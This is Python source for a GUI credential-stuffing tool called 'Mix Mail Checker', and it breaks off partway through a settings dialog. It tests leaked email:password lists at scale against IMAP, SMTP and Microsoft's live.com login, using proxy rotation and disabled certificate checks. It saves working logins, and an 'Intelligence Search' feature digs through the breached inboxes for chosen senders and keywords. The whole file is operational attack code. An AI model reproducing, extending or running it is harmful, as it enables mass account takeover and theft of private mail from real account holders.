import sys
import os
import ssl
import re
import imaplib
import socket
import threading
import time
import configparser
from queue import Queue, Empty
from datetime import datetime, timedelta
from collections import deque, defaultdict
import logging
import json
import base64
import email
from email.header import decode_header
from pathlib import Path
import random
import requests
import uuid
import smtplib
import poplib
import dns.resolver
from concurrent.futures import ThreadPoolExecutor, as_completed
import shutil
import urllib3
import ctypes
from urllib.parse import urlparse, parse_qs
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

try:
    from PyQt6.QtWidgets import (
        QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
        QPushButton, QLineEdit, QLabel, QFileDialog, QProgressBar,
        QTextEdit, QCheckBox, QGroupBox, QComboBox, QMessageBox,
        QTableWidget, QTableWidgetItem, QHeaderView, QDialog,
        QFormLayout, QSpinBox, QTabWidget, QStatusBar, QDialogButtonBox,
        QMenu, QSplitter, QListWidget, QListWidgetItem, QInputDialog
    )
    from PyQt6.QtCore import (
        QThread, pyqtSignal, QObject, Qt, QTimer, QSettings, QSize
    )
    from PyQt6.QtGui import (
        QIcon, QFont, QColor, QAction, QBrush, QTextCursor, QPalette
    )
except ModuleNotFoundError:
    print("Error: PyQt6 is not installed. Install with: pip install PyQt6")
    sys.exit(1)

VERSION = "3.0"
AUTHOR = "@updh1"

CONFIG_FILE = "config.ini"

def create_default_config():
    if not os.path.exists(CONFIG_FILE):
        config = configparser.ConfigParser()
        config['Settings'] = {
            'mode': 'gui',
            'threads': '50',
            'timeout': '10',
            'delimiter': ':',
            'theme': 'dark'
        }
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            config.write(f)
        return config
    else:
        config = configparser.ConfigParser()
        config.read(CONFIG_FILE, encoding='utf-8')
        if 'Settings' not in config:
            config['Settings'] = {
                'mode': 'gui',
                'threads': '50',
                'timeout': '10',
                'delimiter': ':',
                'theme': 'dark'
            }
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
                config.write(f)
        return config

config = create_default_config()
MODE = config.get('Settings', 'mode', fallback='gui')

# ============ GUI MODE ============
if MODE == 'gui':
    print(f"[+] Mix Mail Checker v{VERSION} by {AUTHOR}")
    print("[+] Running in GUI mode...\n")

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def create_results_folder():
        results_dir = Path("Results")
        results_dir.mkdir(exist_ok=True)
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        timestamped_dir = results_dir / f"Data-{timestamp}"
        timestamped_dir.mkdir(exist_ok=True)
        return timestamped_dir

    results_folder = create_results_folder()

    logging.basicConfig(level=logging.INFO,
                        format='%(asctime)s - %(threadName)s - %(levelname)s - %(message)s',
                        handlers=[logging.FileHandler(results_folder / "Mix Mail Checker.log", mode='w', encoding='utf-8')])

    def create_default_domains_ini_gui():
        if not os.path.exists('domains.ini'):
            config_ini = configparser.ConfigParser()
            config_ini['DEFAULT'] = {'server': 'imap.default.com', 'port': '993'}
            config_ini['gmail.com'] = {'server': 'imap.gmail.com', 'port': '993'}
            config_ini['yahoo.com'] = {'server': 'imap.mail.yahoo.com', 'port': '993'}
            config_ini['outlook.com'] = {'server': 'outlook.office365.com', 'port': '993'}
            config_ini['hotmail.com'] = {'server': 'outlook.office365.com', 'port': '993'}
            config_ini['aol.com'] = {'server': 'imap.aol.com', 'port': '993'}
            config_ini['icloud.com'] = {'server': 'imap.mail.me.com', 'port': '993'}
            with open('domains.ini', 'w', encoding='utf-8') as f:
                config_ini.write(f)

    def decode_mime_header(header):
        if header is None:
            return ""
        decoded_parts = decode_header(header)
        parts = []
        for part, charset in decoded_parts:
            if isinstance(part, bytes):
                try:
                    parts.append(part.decode(charset or 'utf-8', errors='ignore'))
                except (LookupError, TypeError):
                    parts.append(part.decode('utf-8', errors='ignore'))
            else:
                parts.append(str(part))
        return "".join(parts)

    def parse_email_body(msg):
        body = ""
        if msg.is_multipart():
            for part in msg.walk():
                content_type = part.get_content_type()
                content_disposition = str(part.get("Content-Disposition"))
                if content_type in ["text/plain", "text/html"] and "attachment" not in content_disposition:
                    try:
                        payload = part.get_payload(decode=True)
                        charset = part.get_content_charset() or 'utf-8'
                        part_body = payload.decode(charset, errors='replace')
                        body += part_body + "\n"
                    except Exception:
                        continue
        else:
            try:
                payload = msg.get_payload(decode=True)
                charset = msg.get_content_charset() or 'utf-8'
                body = payload.decode(charset, errors='replace')
            except Exception:
                body = ""
        return body

    # ============ GENERATE USER AGENT ============
    def generate_user_agent():
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        ]
        return random.choice(user_agents)

    def get_flag(country_code: str) -> str:
        flag_map = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'BR': '🇧🇷', 'IN': '🇮🇳',
            'JP': '🇯🇵', 'KR': '🇰🇷', 'CN': '🇨🇳', 'RU': '🇷🇺', 'MX': '🇲🇽',
            'SA': '🇸🇦', 'AE': '🇦🇪', 'TR': '🇹🇷', 'NL': '🇳🇱', 'SE': '🇸🇪',
            'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'PL': '🇵🇱', 'CZ': '🇨🇿',
            'GR': '🇬🇷', 'PT': '🇵🇹', 'IE': '🇮🇪', 'CH': '🇨🇭', 'AT': '🇦🇹',
            'BE': '🇧🇪', 'LU': '🇱🇺', 'IS': '🇮🇸', 'NZ': '🇳🇿', 'SG': '🇸🇬',
            'MY': '🇲🇾', 'ID': '🇮🇩', 'TH': '🇹🇭', 'VN': '🇻🇳', 'PH': '🇵🇭'
        }
        return flag_map.get(country_code.upper(), '🏴')

    # ============ IMAP WORKER ============
    class IMAPWorkerSignals(QObject):
        progress = pyqtSignal(int, int, int, int, int)
        result = pyqtSignal(str, str, str)
        log = pyqtSignal(str, QColor)
        finished = pyqtSignal(dict, float, int)
        cpm = pyqtSignal(int)
        domain_stat = pyqtSignal(str, str)
        keyword_hit_details = pyqtSignal(str, str, str, str, list)

    class IMAPCheckerWorker(QObject):
        def __init__(self, settings, output_folder):
            super().__init__()
            self.settings = settings
            self.output_folder = output_folder
            self.is_running = True
            self.is_paused = False
            self.lock = threading.Lock()
            self.stats = {'hits': 0, 'custom': 0, 'bad': 0, 'checked': 0, 'keyword_hits': 0}
            self.combo_queue = Queue()
            self.proxy_queue = Queue()
            self.signals = IMAPWorkerSignals()
            self.domain_mappings = self.settings.get('domain_mappings', {})
            self.start_time = 0
            self.checks_in_last_minute = deque(maxlen=200)

        def get_imap_server(self, domain):
            if domain in self.domain_mappings:
                mapping = self.domain_mappings[domain]
                return mapping['server'], mapping['port']
            return f"imap.{domain}", 993

        def stop(self):
            self.is_running = False

        def toggle_pause(self):
            self.is_paused = not self.is_paused

        def run(self):
            self.is_running = True
            self.start_time = time.time()
            
            output_files = {
                'hits': open(self.output_folder / 'Hits.txt', 'w', encoding='utf-8'),
                'invalids': open(self.output_folder / 'invalids.txt', 'w', encoding='utf-8'),
                'inbox_hits': open(self.output_folder / 'Inbox_hits.txt', 'w', encoding='utf-8'),
            }
            
            threads = []
            for _ in range(self.settings['threads']):
                thread = threading.Thread(target=self.worker_thread, args=(output_files,), daemon=True)
                threads.append(thread)
                thread.start()
            
            for t in threads:
                t.join()

            for f in output_files.values():
                f.close()
            
            elapsed_time = time.time() - self.start_time
            final_cpm = int((self.stats['checked'] / elapsed_time) * 60) if elapsed_time > 0 else 0
            self.signals.finished.emit(self.stats, elapsed_time, final_cpm)

        def update_cpm(self):
            now = time.monotonic()
            self.checks_in_last_minute.append(now)
            while self.checks_in_last_minute and self.checks_in_last_minute[0] < now - 60:
                self.checks_in_last_minute.popleft()
            cpm_val = len(self.checks_in_last_minute)
            self.signals.cpm.emit(cpm_val)

        def worker_thread(self, output_files):
            while self.is_running:
                while self.is_paused:
                    time.sleep(0.1)
                    if not self.is_running:
                        return

                try:
                    combo = self.combo_queue.get(timeout=1)
                except Empty:
                    if threading.main_thread().is_alive():
                        continue
                    else:
                        self.is_running = False
                        break
                
                domain = ""
                try:
                    email, password = combo.strip().split(self.settings['delimiter'])
                    domain = email.split('@')[1]
                    server, port = self.get_imap_server(domain)
                    self.check_combo(email, password, server, port, output_files, domain)
                except ValueError:
                    self.log_and_update(f"Skipping malformed line: {combo}", QColor("orange"))
                    with self.lock:
                        self.stats['bad'] += 1
                except Exception as e:
                    self.log_and_update(f"Worker error on {combo}: {e}", QColor("red"))
                    if domain:
                        self.signals.domain_stat.emit(domain, "error")
                    with self.lock:
                        self.stats['bad'] += 1
                finally:
                    with self.lock:
                        self.stats['checked'] += 1
                    self.signals.progress.emit(
                        self.stats['checked'], self.stats['hits'], self.stats['bad'], 
                        self.stats['custom'], self.stats['keyword_hits']
                    )
                    self.update_cpm()
                    self.combo_queue.task_done()
            
        def log_and_update(self, msg, color):
            logging.info(msg)
            self.signals.log.emit(msg, color)

        def check_combo(self, email_addr, password, server, port, output_files, domain):
            combo_str = f"{email_addr}:{password}"
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE

                with imaplib.IMAP4_SSL(host=server, port=port, ssl_context=context, timeout=self.settings['timeout']) as imap_server:
                    typ, data = imap_server.login(email_addr, password)
                    if typ == 'OK':
                        with self.lock:
                            self.stats['hits'] += 1
                        output_files['hits'].write(combo_str + '\n')
                        output_files['hits'].flush()
                        self.signals.result.emit("hit", combo_str, f"Server: {server}")
                        self.signals.domain_stat.emit(domain, "hit")
                        self.log_and_update(f"HIT -> {combo_str}", QColor("lime"))
                        
                        if self.settings['intelligence_search_enabled']:
                            self.search_inbox(imap_server, email_addr, password, output_files)
                    else:
                        raise imaplib.IMAP4.error(data[0].decode() if data else "Login failed")

            except (imaplib.IMAP4.error, imaplib.IMAP4.abort) as e:
                with self.lock:
                    self.stats['bad'] += 1
                output_files['invalids'].write(combo_str + '\n')
                output_files['invalids'].flush()
                self.signals.result.emit("bad", combo_str, "Invalid Credentials")
                self.signals.domain_stat.emit(domain, "bad")
                self.log_and_update(f"BAD -> {combo_str}", QColor("red"))
            except (socket.timeout, TimeoutError, ConnectionRefusedError, socket.gaierror) as e:
                with self.lock:
                    self.stats['bad'] += 1
                self.signals.result.emit("bad", combo_str, f"{type(e).__name__}")
                self.signals.domain_stat.emit(domain, "bad")
                self.log_and_update(f"BAD -> {combo_str} ({type(e).__name__})", QColor("orange"))
            except Exception as e:
                with self.lock:
                    self.stats['bad'] += 1
                self.signals.result.emit("bad", combo_str, str(type(e).__name__))
                self.signals.domain_stat.emit(domain, "bad")
                self.log_and_update(f"BAD -> {combo_str} ({type(e).__name__})", QColor("orange"))
        
        def _build_nested_or_query(self, criteria):
            if not criteria:
                return "(ALL)"
            if len(criteria) == 1:
                return criteria[0]
            return f"(OR {criteria[0]} {self._build_nested_or_query(criteria[1:])})"

        def search_inbox(self, imap_server, email_addr, password, output_files):
            try:
                senders = [s.strip() for s in self.settings['intelligence_senders'].split('\n') if s.strip()]
                keywords = [k.strip() for k in self.settings['intelligence_keywords'].split('\n') if k.strip()]
                search_in_subject = self.settings['search_in_subject']
                search_in_body = self.settings['search_in_body']
                
                if not any([senders, keywords]):
                    return
                
                search_parts = []
                if senders:
                    search_parts.extend([f'(FROM "{s}")' for s in senders])
                if keywords:
                    if search_in_subject:
                        search_parts.extend([f'(SUBJECT "{k}")' for k in keywords])
                    if search_in_body:
                        search_parts.extend([f'(BODY "{k}")' for k in keywords])

                if not search_parts:
                    return

                search_query = self._build_nested_or_query(search_parts)
                fetch_count = min(self.settings['intelligence_emails_to_fetch'], 10)
                fetched_emails_for_account = defaultdict(list)

                for mailbox in self.settings['intelligence_mailboxes'].split(','):
                    try:
                        imap_server.select(f'"{mailbox.strip()}"', readonly=True)
                        typ, data = imap_server.search(None, search_query)
                        if typ != 'OK' or not data[0]:
                            continue
                        uids = data[0].split()
                        if len(uids) > 30:
                            uids = uids[-30:]

                        for uid in uids[-fetch_count:]:
                            try:
                                typ, msg_data = imap_server.fetch(uid, '(RFC822)')
                                if typ != 'OK':
                                    continue
                                raw_email = msg_data[0][1]
                                email_message = email.message_from_bytes(raw_email)
                                subject = decode_mime_header(email_message['Subject'])
                                from_ = decode_mime_header(email_message['From'])
                                date_ = decode_mime_header(email_message['Date'])
                                body = parse_email_body(email_message)
                                email_content = {
                                    'subject': subject, 'from': from_, 'date': date_, 'body': body,
                                    'headers': "".join(f"{k}: {v}\n" for k, v in email_message.items())
                                }
                                for sender in senders:
                                    if sender.lower() in from_.lower():
                                        fetched_emails_for_account[sender].append(email_content)
                                for keyword in keywords:
                                    if (search_in_subject and keyword.lower() in subject.lower()) or \
                                       (search_in_body and keyword.lower() in body.lower()):
                                        fetched_emails_for_account[keyword].append(email_content)
                            except Exception:
                                continue
                        
                        if fetched_emails_for_account:
                            with self.lock:
                                self.stats['keyword_hits'] += 1
                            for match_detail, details_list in fetched_emails_for_account.items():
                                match_type = "Sender" if match_detail in senders else "Keyword"
                                unique_details = [dict(t) for t in {tuple(d.items()) for d in details_list}]
                                self.signals.keyword_hit_details.emit(email_addr, match_type, match_detail, mailbox.strip(), unique_details)

                    except imaplib.IMAP4.error:
                        continue
                
                if fetched_emails_for_account:
                    keyword_matches = [match_detail for match_detail in fetched_emails_for_account if match_detail in keywords]
                    if keyword_matches:
                        total_msg_count = sum(len(details_list) for match_detail, details_list in fetched_emails_for_account.items() if match_detail in keywords)
                        output_files['inbox_hits'].write(f"{email_addr}:{password} | {', '.join(keyword_matches)} | {total_msg_count} msg\n")
                        output_files['inbox_hits'].flush()
            
            except Exception as e:
                self.log_and_update(f"Intelligence search failed for {email_addr}: {e}", QColor("red"))

    # ============ SMTP WORKER ============
    class SMTPWorkerSignals(QObject):
        progress = pyqtSignal(int, int, int)
        result = pyqtSignal(str, str, str)
        log = pyqtSignal(str, QColor)
        finished = pyqtSignal(dict, float, int)
        cpm = pyqtSignal(int)

    class SMTPCheckerWorker(QObject):
        def __init__(self, settings):
            super().__init__()
            self.settings = settings
            self.is_running = True
            self.is_paused = False
            self.lock = threading.Lock()
            self.stats = {'checked': 0, 'valid': 0, 'invalid': 0}
            self.combo_queue = Queue()
            self.signals = SMTPWorkerSignals()
            self.start_time = 0
            self.checks_in_last_minute = deque(maxlen=200)
            
            self.smtp_map = {
                'gmail.com': ('smtp.gmail.com', [465, 587]),
                'yahoo.com': ('smtp.mail.yahoo.com', [465, 587]),
                'outlook.com': ('smtp.office365.com', [587, 465]),
                'hotmail.com': ('smtp.office365.com', [587, 465]),
                'aol.com': ('smtp.aol.com', [587, 465]),
                'yandex.com': ('smtp.yandex.com', [465, 587]),
                'mail.com': ('smtp.mail.com', [465, 587]),
                'protonmail.com': ('smtp.protonmail.ch', [587, 465]),
                'icloud.com': ('smtp.mail.me.com', [587, 465]),
            }
            self.dns_cache = {}
            self.dns_cache_lock = threading.Lock()

        def get_mx_smtp_host_cached(self, domain):
            with self.dns_cache_lock:
                if domain in self.dns_cache:
                    return self.dns_cache[domain]
            try:
                answers = dns.resolver.resolve(domain, 'MX')
                mx_hosts = [str(r.exchange).rstrip('.') for r in answers]
                result = mx_hosts[0] if mx_hosts else f"smtp.{domain}"
            except:
                result = f"smtp.{domain}"
            with self.dns_cache_lock:
                self.dns_cache[domain] = result
            return result

        def detect_smtp_server_fast(self, email):
            domain = email.split('@')[-1].lower()
            if domain in self.smtp_map:
                host, ports = self.smtp_map[domain]
                return host, ports
            mx_host = self.get_mx_smtp_host_cached(domain)
            return mx_host, [587, 465, 25]

        def check_smtp_ultra_fast(self, email, password, timeout=3):
            host, ports = self.detect_smtp_server_fast(email)
            if 'gmail' in host or 'yahoo' in host:
                test_ports = [465, 587]
            elif 'office365' in host:
                test_ports = [587, 465]
            else:
                test_ports = [587, 465, 25]
            for port in test_ports:
                try:
                    socket.setdefaulttimeout(timeout)
                    if port == 465:
                        server = smtplib.SMTP_SSL(host, port, timeout=timeout)
                    else:
                        server = smtplib.SMTP(host, port, timeout=timeout)
                    server.ehlo_or_helo_if_needed()
                    if port == 587:
                        try:
                            server.starttls()
                            server.ehlo()
                        except:
                            server.quit()
                            continue
                    server.login(email, password)
                    server.quit()
                    return True, host, port
                except smtplib.SMTPAuthenticationError:
                    return False, host, port
                except Exception:
                    continue
            return False, host, 0

        def stop(self):
            self.is_running = False

        def toggle_pause(self):
            self.is_paused = not self.is_paused

        def run(self):
            self.is_running = True
            self.start_time = time.time()
            
            threads = []
            for _ in range(self.settings['threads']):
                thread = threading.Thread(target=self.worker_thread, daemon=True)
                threads.append(thread)
                thread.start()
            
            for t in threads:
                t.join()
            
            elapsed_time = time.time() - self.start_time
            final_cpm = int((self.stats['checked'] / elapsed_time) * 60) if elapsed_time > 0 else 0
            self.signals.finished.emit(self.stats, elapsed_time, final_cpm)

        def update_cpm(self):
            now = time.monotonic()
            self.checks_in_last_minute.append(now)
            while self.checks_in_last_minute and self.checks_in_last_minute[0] < now - 60:
                self.checks_in_last_minute.popleft()
            cpm_val = len(self.checks_in_last_minute)
            self.signals.cpm.emit(cpm_val)

        def worker_thread(self):
            while self.is_running:
                while self.is_paused:
                    time.sleep(0.1)
                    if not self.is_running:
                        return

                try:
                    email, password = self.combo_queue.get(timeout=0.5)
                except Empty:
                    if threading.main_thread().is_alive():
                        continue
                    else:
                        self.is_running = False
                        break
                
                try:
                    result, host, port = self.check_smtp_ultra_fast(email, password)
                    
                    with self.lock:
                        self.stats['checked'] += 1
                    
                    if result:
                        with self.lock:
                            self.stats['valid'] += 1
                        self.signals.result.emit("valid", f"{email}:{password}", f"{host}|{port}")
                        self.signals.log.emit(f"VALID -> {email}:{password}", QColor("lime"))
                    else:
                        with self.lock:
                            self.stats['invalid'] += 1
                        self.signals.result.emit("invalid", email, "Invalid credentials")
                        self.signals.log.emit(f"INVALID -> {email}", QColor("red"))
                    
                except Exception as e:
                    with self.lock:
                        self.stats['invalid'] += 1
                    self.signals.log.emit(f"ERROR -> {email}: {str(e)}", QColor("orange"))
                
                finally:
                    self.signals.progress.emit(
                        self.stats['checked'], self.stats['valid'], self.stats['invalid']
                    )
                    self.update_cpm()
                    self.combo_queue.task_done()

    # ============ HOTMAIL CHECKER WORKER ============
    class HotmailWorkerSignals(QObject):
        progress = pyqtSignal(int, int, int, int, int)
        result = pyqtSignal(str, str, str)
        log = pyqtSignal(str, QColor)
        finished = pyqtSignal(dict, float, int)
        cpm = pyqtSignal(int)

    class HotmailCheckerWorker(QObject):
        def __init__(self, settings):
            super().__init__()
            self.settings = settings
            self.is_running = True
            self.is_paused = False
            self.lock = threading.Lock()
            self.stats = {'checked': 0, 'valid': 0, 'inbox': 0, 'custom': 0, 'bad': 0, '2fa': 0, 'errors': 0}
            self.combo_queue = Queue()
            self.proxy_queue = Queue()
            self.signals = HotmailWorkerSignals()
            self.start_time = 0
            self.checks_in_last_minute = deque(maxlen=200)

        def stop(self):
            self.is_running = False

        def toggle_pause(self):
            self.is_paused = not self.is_paused

        def run(self):
            self.is_running = True
            self.start_time = time.time()
            
            threads = []
            for _ in range(self.settings['threads']):
                thread = threading.Thread(target=self.worker_thread, daemon=True)
                threads.append(thread)
                thread.start()
            
            for t in threads:
                t.join()
            
            elapsed_time = time.time() - self.start_time
            final_cpm = int((self.stats['checked'] / elapsed_time) * 60) if elapsed_time > 0 else 0
            self.signals.finished.emit(self.stats, elapsed_time, final_cpm)

        def update_cpm(self):
            now = time.monotonic()
            self.checks_in_last_minute.append(now)
            while self.checks_in_last_minute and self.checks_in_last_minute[0] < now - 60:
                self.checks_in_last_minute.popleft()
            cpm_val = len(self.checks_in_last_minute)
            self.signals.cpm.emit(cpm_val)

        def worker_thread(self):
            while self.is_running:
                while self.is_paused:
                    time.sleep(0.1)
                    if not self.is_running:
                        return

                try:
                    combo = self.combo_queue.get(timeout=1)
                except Empty:
                    if threading.main_thread().is_alive():
                        continue
                    else:
                        self.is_running = False
                        break
                
                try:
                    self.check_hotmail_account(combo)
                except Exception as e:
                    with self.lock:
                        self.stats['errors'] += 1
                    self.signals.log.emit(f"Error: {str(e)}", QColor("red"))
                finally:
                    with self.lock:
                        self.stats['checked'] += 1
                    self.signals.progress.emit(
                        self.stats['checked'], self.stats['valid'], self.stats['inbox'],
                        self.stats['bad'], self.stats['2fa']
                    )
                    self.update_cpm()
                    self.combo_queue.task_done()

        def get_urlPost_sFTTag(self, session, email):
            sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
            maxretries = 3
            attempts = 0
            
            while attempts < maxretries:
                try:
                    headers = {
                        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0", 
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
                        'Accept-Language': 'en-US,en;q=0.9', 
                        'Accept-Encoding': 'gzip, deflate, br', 
                        'Connection': 'keep-alive', 
                        'Upgrade-Insecure-Requests': '1'
                    }
                    
                    text = session.get(sFTTag_url, headers=headers, timeout=self.settings['timeout'], verify=False).text
                    
                    match = re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or \
                           re.search('value="(.+?)"', text, re.S) or \
                           re.search("sFTTag:'(.+?)'", text, re.S) or \
                           re.search('sFTTag:"(.+?)"', text, re.S) or \
                           re.search('name="PPFT".*?value="(.+?)"', text, re.S)
                    
                    if match:
                        sFTTag = match.group(1)
                        match = re.search('"urlPost":"(.+?)"', text, re.S) or \
                               re.search("urlPost:'(.+?)'", text, re.S) or \
                               re.search('urlPost:"(.+?)"', text, re.S) or \
                               re.search('<form.*?action="(.+?)"', text, re.S)
                        
                        if match:
                            urlPost = match.group(1)
                            urlPost = urlPost.replace('&amp;', '&')
                            return urlPost, sFTTag
                except Exception:
                    pass
                
                attempts += 1
                time.sleep(0.5)
            
            return None, None

        def check_hotmail_account(self, combo):
            try:
                if ':' not in combo:
                    return
                
                email, password = combo.split(':', 1)
                email = email.strip()
                password = password.strip()
                
                session = requests.Session()
                session.verify = False
                
                # Pobierz proxy jeśli dostępne
                proxy = None
                try:
                    if not self.proxy_queue.empty():
                        proxy_line = self.proxy_queue.get()
                        proxy = proxy_line.strip()
                        if proxy:
                            if not proxy.startswith('http'):
                                proxy = f"http://{proxy}"
                            session.proxies = {'http': proxy, 'https': proxy}
                except:
                    pass
                
                urlPost, sFTTag = self.get_urlPost_sFTTag(session, email)
                if not urlPost or not sFTTag:
                    with self.lock:
                        self.stats['bad'] += 1
                    self.signals.result.emit("bad", email, "Failed to get login page")
                    return

                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded', 
                    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", 
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
                    'Accept-Language': 'en-US,en;q=0.9', 
                    'Accept-Encoding': 'gzip, deflate, br', 
                    'Connection': 'close'
                }
                
                login_request = session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=self.settings['timeout'], verify=False)
                
                if '#' in login_request.url and login_request.url != 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en':
                    token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                    if token != 'None':
                        with self.lock:
                            self.stats['valid'] += 1
                        self.signals.result.emit("valid", f"{email}:{password}", "Microsoft account")
                        self.signals.log.emit(f"VALID -> {email}", QColor("lime"))
                        return
                
                elif any(value in login_request.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt=']):
                    with self.lock:
                        self.stats['2fa'] += 1
                    self.signals.result.emit("2fa", f"{email}:{password}", "2FA required")
                    self.signals.log.emit(f"2FA -> {email}", QColor("yellow"))
                    return
                
                else:
                    with self.lock:
                        self.stats['bad'] += 1
                    self.signals.result.emit("bad", email, "Invalid credentials")
                    self.signals.log.emit(f"BAD -> {email}", QColor("red"))
                    
            except Exception as e:
                with self.lock:
                    self.stats['errors'] += 1
                self.signals.log.emit(f"Error checking {combo}: {str(e)}", QColor("red"))

    # ============ IMAP CLIENT FOR VIEWER ============
    class IMAPClientSignals(QObject):
        error = pyqtSignal(str)
        mailboxes_loaded = pyqtSignal(list)
        emails_loaded = pyqtSignal(list)
        email_content_loaded = pyqtSignal(dict)
        connection_success = pyqtSignal()

    class IMAPClient(QObject):
        def __init__(self, email, password, server, parent=None):
            super().__init__(parent)
            self.email = email
            self.password = password
            self.server = server
            self.signals = IMAPClientSignals()
            self.imap = None

        def connect(self):
            try:
                context = ssl.create_default_context()
                self.imap = imaplib.IMAP4_SSL(self.server, ssl_context=context, timeout=30)
                typ, data = self.imap.login(self.email, self.password)
                if typ == 'OK':
                    self.signals.connection_success.emit()
                    return True
                else:
                    self.signals.error.emit(f"Login failed")
                    return False
            except Exception as e:
                self.signals.error.emit(f"Connection failed: {str(e)[:100]}")
                return False

        def list_mailboxes(self):
            if not self.imap: 
                return
            try:
                typ, mailboxes_data = self.imap.list()
                mailboxes = []
                if typ == 'OK':
                    for mbox in mailboxes_data:
                        try:
                            parts = mbox.decode().split(' "." ')
                            if len(parts) == 2:
                                name = parts[1].strip().replace('"', '')
                                mailboxes.append(name)
                        except:
                            continue
                self.signals.mailboxes_loaded.emit(mailboxes)
            except Exception as e:
                self.signals.error.emit(f"Failed to list mailboxes: {str(e)[:100]}")

        def fetch_emails(self, mailbox, search_term=None, count=50):
            if not self.imap: 
                return
            try:
                self.imap.select(f'"{mailbox}"', readonly=True)
                search_query = 'ALL'
                if search_term and search_term.strip():
                    search_query = f'OR (FROM "{search_term}") (SUBJECT "{search_term}")'
                typ, data = self.imap.search(None, search_query)
                if typ != 'OK':
                    self.signals.error.emit(f"Failed to search in {mailbox}")
                    return
                email_ids = data[0].split() if data[0] else []
                emails = []
                for uid in reversed(email_ids[-count:]):
                    try:
                        typ, msg_data = self.imap.fetch(uid, '(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM DATE)])')
                        if typ == 'OK':
                            msg = email.message_from_bytes(msg_data[0][1])
                            emails.append({
                                'uid': uid.decode(),
                                'subject': decode_mime_header(msg['subject']),
                                'from': decode_mime_header(msg['from']),
                                'date': decode_mime_header(msg['date'])
                            })
                    except Exception:
                        continue
                self.signals.emails_loaded.emit(emails)
            except Exception as e:
                self.signals.error.emit(f"Failed to fetch emails: {str(e)[:100]}")

        def fetch_email_content(self, uid):
            if not self.imap: 
                return
            try:
                typ, msg_data = self.imap.fetch(uid, '(RFC822)')
                if typ == 'OK':
                    raw_email = msg_data[0][1]
                    email_message = email.message_from_bytes(raw_email)
                    body = parse_email_body(email_message)
                    headers = "".join(f"{k}: {v}\n" for k, v in email_message.items())
                    self.signals.email_content_loaded.emit({'body': body[:5000], 'headers': headers[:5000]})
            except Exception as e:
                self.signals.error.emit(f"Failed to fetch content: {str(e)[:100]}")

        def disconnect(self):
            if self.imap:
                try:
                    self.imap.logout()
                except Exception:
                    pass

    # ============ SETTINGS DIALOG ============
    class SettingsDialog(QDialog):
        def __init__(self, settings_manager, parent=None):
            super().__init__(parent)
            self.settings_manager = settings_manager
            self.setWindowTitle("Mix Mail Checker Settings")
            self.setMinimumWidth(550)
            self.layout = QVBoxLayout(self)
            
            tabs = QTabWidget()
            self.layout.addWidget(tabs)
            
            general_tab = QWidget()
            proxy_tab = QWidget()
            intelligence_tab = QWidget()
            appearance_tab = QWidget()

            tabs.addTab(general_tab, "General")
            tabs.addTab(proxy_tab, "Proxy")
            tabs.addTab(intelligence_tab, "Intelligence Search")
            tabs.addTab(appearance_tab, "Appearance")

            self.init_general_tab(general_tab)
            self.init_proxy_tab(proxy_tab)
            self.init_intelligence_tab(intelligence_tab)
            self.init_appearance_tab(appearance_tab)
            
            self.buttons = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel)
            self.buttons.accepted.connect(self.accept)
